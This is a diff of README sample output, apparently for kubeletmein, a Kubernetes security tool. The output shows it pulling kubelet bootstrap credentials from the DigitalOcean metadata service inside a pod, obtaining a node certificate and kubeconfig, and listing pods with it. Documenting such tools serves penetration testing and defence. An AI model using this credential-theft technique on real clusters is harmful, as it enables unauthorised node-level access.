@@ -92,18 +92,20 @@ kubectl --kubeconfig kubeconfig get pods
 
 ```
 root@kubeletmein-vulnerable:/# kubeletmein generate
-2021-03-04T23:39:46Z [ℹ]  running autodetect
-2021-03-04T23:39:46Z [ℹ]  DigitalOcean detected
-2021-03-04T23:39:46Z [ℹ]  fetching kubelet creds from metadata service
-2021-03-04T23:39:46Z [ℹ]  writing ca cert to: ca-certificates.crt
-2021-03-04T23:39:46Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig
-2021-03-04T23:39:46Z [ℹ]  wrote bootstrap-kubeconfig
-2021-03-04T23:39:46Z [ℹ]  using bootstrap-config to request new cert for node: kubeletmein-node
-2021-03-04T23:39:46Z [ℹ]  got new cert and wrote kubeconfig
-2021-03-04T23:39:46Z [ℹ]  now try: kubectl --kubeconfig kubeconfig get pods
-root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig get pods
+2021-03-10T11:57:53Z [ℹ]  running autodetect
+2021-03-10T11:57:53Z [ℹ]  DigitalOcean detected
+2021-03-10T11:57:53Z [ℹ]  fetching kubelet creds from metadata service
+2021-03-10T11:57:53Z [ℹ]  generating bootstrap-kubeconfig file at: bootstrap-kubeconfig.yaml
+2021-03-10T11:57:53Z [ℹ]  wrote bootstrap-kubeconfig
+2021-03-10T11:57:53Z [ℹ]  using bootstrap-config to request new cert for node: kubeletmein-pool-87nm2
+2021-03-10T11:57:53Z [ℹ]  Using bootstrap kubeconfig to generate TLS client cert, key and kubeconfig file
+2021-03-10T11:57:53Z [ℹ]  Waiting for client certificate to be issued
+2021-03-10T11:57:53Z [ℹ]  got new cert and wrote kubeconfig
+2021-03-10T11:57:53Z [ℹ]  now try: kubectl --kubeconfig kubeconfig.yaml get pods
+
+root@kubeletmein-vulnerable:/# kubectl --kubeconfig kubeconfig.yaml get pods
 NAME                     READY   STATUS    RESTARTS   AGE
-kubeletmein-vulnerable   1/1     Running   0          6m12s
+kubeletmein-vulnerable   1/1     Running   0          2m30s
 ```
 
 ## Testing
